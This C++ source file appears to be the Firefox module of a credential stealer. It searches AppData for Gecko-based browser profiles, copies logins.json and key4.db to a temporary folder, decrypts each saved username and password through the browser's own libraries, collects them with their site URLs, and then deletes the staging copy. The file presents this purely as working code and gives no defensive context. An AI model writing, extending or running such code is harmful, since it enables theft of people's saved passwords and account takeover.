﻿#include "firefox_parser.h"

#include <iostream>
#include <json.hpp>

#include "FileOperations.h"
#include "FirefoxDecryptor.h"
#include "RegEditHelper.h"

firefox_parser::firefox_parser()
{

}




List<AccountData> firefox_parser::collect_data()
{
	auto browsers = this->get_mozilla_browsers();

	for (auto& browser : browsers)
	{

		
		auto dir_profile = this->get_profile_dir(browser);	
		
		String temp_dir;
		this->prepare_imports(dir_profile, temp_dir);



		auto mozilla_path = this->get_mozilla_program_dir(temp_dir);
		
		{
			FirefoxDecryptor decryptor;

			if (!decryptor.init(mozilla_path)) {continue;}
			
			if (!decryptor.set_profile_dir(temp_dir + "\\")) {  continue; }

			auto accounts = this->get_encrypted_data(temp_dir + "\\logins.json");

			for (auto& account : accounts)
			{
				decryptor.decrypt_data(account.Username, account.Username);
				decryptor.decrypt_data(account.Password, account.Password);
			}

			for (auto& account : accounts)
			{
				m_account_data.emplace_back(std::move(account));
			}
		}

		IO::remove_directory(temp_dir.c_str());
		
	}

	return m_account_data;
}

List<String> firefox_parser::get_mozilla_browsers()
{
	const auto m_path_local_data = IO::get_app_folder(CSIDL_APPDATA);

	List<String> foundBrowsers;
	for (auto& browser : m_gecko_list)
	{
		std::string bdir = m_path_local_data + browser;
		if (IO::is_exist_dir(bdir))
		{
			foundBrowsers.emplace_back(bdir);
		}
	}
	return std::move(foundBrowsers);
}

String firefox_parser::get_profile_dir(const String& dir_localdata)
{
	try
	{		
		String dir = dir_localdata + "\\Profiles";
		
		if (IO::is_exist_dir(dir))
		{
			List<String> sub_profiles;
			IO::get_subdirs(sub_profiles, dir);
			
			for (const auto& profile_mozilla : sub_profiles)
			{
				auto dir_profile = dir + "\\" + profile_mozilla;
				
				const std::string logins = (dir_profile + "\\logins.json");
				const std::string key4_db = (dir_profile + "\\key4.db");
				const std::string places_sqlite = (dir_profile + "\\places.sqlite");
				
				if (IO::is_file_exists(logins) || IO::is_file_exists(key4_db) || IO::is_file_exists(places_sqlite))
				{
					return dir_profile;
				}
			}			
		}		
	}
	catch (...)
	{
		
	}
	return "";
}

String firefox_parser::get_mozilla_program_dir(const String& temp_dir)
{
	const String path_to_ini_file = temp_dir + "\\compatibility.ini";
	
	IniParser ini_reader;
	if (!ini_reader.parseFile(path_to_ini_file)) return "";

	try
	{
		return ini_reader["Compatibility.LastPlatformDir"];
	}
	catch (...)
	{
	}
	
	return "";
}

List<AccountData> firefox_parser::get_encrypted_data(const String& path_to_json)
{
	String data_logins;
	List<AccountData> accounts_data;
	
	if (!IO::read_file(path_to_json, data_logins)) return {};
	
	auto _json = nlohmann::json::parse(data_logins);
	if (_json.empty()) return {};
	if(!_json.contains("logins")) return {};

	for (auto& login_json : _json.at("logins").items())
	{
		AccountData account;
		auto login_item = login_json.value();
		if(login_item.contains("hostname"))		
			account.Url = login_item.at("hostname").get<std::string>();

		if (login_item.contains("encryptedUsername"))
			account.Username = login_item.at("encryptedUsername").get<std::string>();

		if (login_item.contains("encryptedPassword"))
			account.Password = login_item.at("encryptedPassword").get<std::string>();

		accounts_data.emplace_back(account);
	}


	return accounts_data;
}

bool firefox_parser::prepare_imports(String profile_dir, String& out_temp_dir)
{
	String profile_name;
	
	auto firstNull = profile_dir.find_last_of("\\");
	if (firstNull != String::npos)
		profile_name = profile_dir.substr(firstNull+1);

	out_temp_dir = IO::get_temp_folder() + profile_name;

	if (!IO::is_exist_dir(out_temp_dir))
		IO::create_directory_recursively(out_temp_dir.c_str());

	for(const auto& file : m_required_files)
	{
		try
		{
			
			auto from = (profile_dir+"\\" + file);
			auto to = (out_temp_dir + "\\" + file);

			if (IO::is_file_exists(from))
				IO::copy_file(from, to);
		}
		catch (...)
		{
			return false;
		}
	}

	
	return true;
}


/*
 *
 *
 *
 *
 * 
 */
